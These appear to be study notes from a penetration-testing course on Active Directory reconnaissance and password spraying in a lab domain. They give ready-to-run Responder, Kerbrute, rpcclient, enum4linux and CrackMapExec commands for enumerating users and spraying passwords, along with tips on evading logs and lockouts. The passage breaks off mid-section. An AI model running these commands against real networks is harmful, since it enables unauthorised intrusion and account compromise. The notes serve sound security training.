**POINTS TO LOOK FOR IN THIS PHASE**

- AD Users - enumerate valid user accounts we can target for password spraying 

- AD Joined Computers - computers including *domain controllers* , *file servers* , *SQL Servers* , *web servers* , *mail servers* , *database servers*

- key services - kerberos , Netbios , LDAP , DNS

- vulnerable hosts and services - anything that can be quick win ( an esy host to exploit and gain foothold)

**FOR INITIALS WE DID MONITOR NETWORK TRAFFIC TO GET TO KNOW ABOUT WHAT IS HAPPEININNG WE FOUND ARP AND MDNS PACKETS , WE FOUND SOME HOST**

USED TOOLS HERE 
- TCPDUMP
- WIRESHARK (GUI)
- NET-CREDS 
- NETMINER
- PKTMON.EXE(WINDOWS 10 BUILTIN)

AND THE ONE WHICH I DIDNT EXPECT TO SEE HERE **RESPONDER** TO ANALYZE NETWORK TRAFFIC 

[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses.

```BASH
sudo responder -I ens224 -A
```

**PINGING ACTIVE HOST ON THE NETWORK WITH FPING**

Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on.

Here we'll start `fping` with a few flags: `a` to show targets that are alive, `s` to print stats at the end of the scan, `g` to generate a target list from the CIDR network, and `q` to not show per-target results.

```BASH
fping -asgq 172.16.5.0/23
```

 We can combine the successful results and the information we gleaned from our passive checks into a list for a more detailed scan with Nmap

**NMAP SCANNING**
 it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few. Below is a quick example of a simple Nmap scan.

```BASH
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

**KERBRUTE - INTERNAL AD USERNAME ENUMERATION**
 It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts
 - We will use Kerbrute in conjunction with the `jsmith.txt` or `jsmith2.txt`user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective.
 -  We can point Kerbrute at the DC we found earlier and feed it a wordlist.
 - To get started with Kerbrute, we can download [precompiled binaries](https://github.com/ropnop/kerbrute/releases/latest)

```SHELL
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

## PASSWORD POLICY
#### ENUMERATING THE PASSWORD POLICY FROM LINUX - CREDENTIALED

- password policy can also be obtained remotely using tools such as [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or `rpcclient` .
```SHELL
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
OR 
```SHELL
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

#### Enumerating the Password Policy - from Linux - SMB NULL Sessions
- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy
- When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as `enum4linux`, `CrackMapExec`, `rpcclient`, etc.

```shell
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
```

**USING ENUM4LINUX**
```SHELL
enum4linux -P 172.16.5.5
```

- The tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of `enum4linux` in Python, but has additional features such as the ability to export data as YAML or JSON files

```SHELL
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

#### Enumerating Null Session - from Windows
```SHELL
net use \\host\ipc$ "" /u:""

net use \\DC01\ipc$ "" /u:""
```

#### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

- With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable. One example command to get the password policy is as follows:

```SHELL
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

*Note: In newer versions of `ldapsearch`, the `-h` parameter was deprecated in favor for `-H`.*

#### Enumerating the Password Policy - from Windows
 If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as `net.exe` to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

#### Using PowerView


```powershell
PS C:\htb> import-module .\PowerView.ps1 PS C:\htb> Get-DomainPolicy Unicode        : @{Unicode=yes} SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;                  PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;                 LSAAnonymousNameLookup=0} KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1} Version        : @{signature="$CHICAGO$"; Revision=1} RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]} Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI                  NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9} GPODisplayName : Default Domain Policy
```

- PowerView gave us the same output as our `net accounts` command, just in a different format but also revealed that password complexity is enabled (`PasswordComplexity=1`).
- - Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (`Password1` or `Welcome1` would satisfy the "complexity" requirement here, but are still clearly weak passwords).

The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:

| Policy                                      | Default Value |
| ------------------------------------------- | ------------- |
| Enforce password history                    | 24 days       |
| Maximum password age                        | 42 days       |
| Minimum password age                        | 1 day         |
| Minimum password length                     | 7             |
| Password must meet complexity requirements  | Enabled       |
| Store passwords using reversible encryption | Disabled      |
| Account lockout duration                    | Not set       |
| Account lockout threshold                   | 0             |
| Reset account lockout counter after         | Not set       |

## PASSWORD SPRAYING - MAKING A TARGET USER LIST
There are several ways that we can gather a target list of valid users:

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist

#### SMB NULL Session to Pull User List
If you already have credentials for a domain user or `SYSTEM` access on a Windows host, then you can easily query Active Directory for this information.
It’s possible to do this using the SYSTEM account because it can `impersonate` the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). 

*Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include [enum4linux](https://github.com/portcullislabs/enum4linux), [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with `enum4linux` with the `-U` flag.*

#### Using enum4linux
```SHELL
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

#### Using rpcclient
We can use the `enumdomusers` command after connecting anonymously using `rpcclient`.

```SHELL
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

#### Using CrackMapExec --users Flag

Finally, we can use `CrackMapExec` with the `--users` flag. This is a useful tool that will also show the `badpwdcount` (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the `baddpwdtime`, which is the date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.

```SHELL
crackmapexec smb 172.16.5.5 --users
```

#### Gathering Users with LDAP Anonymous

We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include [windapsearch](https://github.com/ropnop/windapsearch) and [ldapsearch](https://linux.die.net/man/1/ldapsearch). If we choose to use `ldapsearch` we will need to specify a valid LDAP search filter

```SHELL
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

#### Using windapsearch
```SHELL
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Enumerating Users with Kerbrute
 This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying

 This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts.

 *However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.*
 
. The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using `Kerbrute`

```SHELL
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy.

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.

#### Using CrackMapExec with Valid Credentials
```SHELL
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

# Internal Password Spraying - from Linux

#### Using a Bash one-liner for the Attack
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Using Kerbrute for the Attack
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

#### Using CrackMapExec & Filtering Logon Failures
```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### Validating the Credentials with CrackMapExec
```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Local Administrator Password Reuse


Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine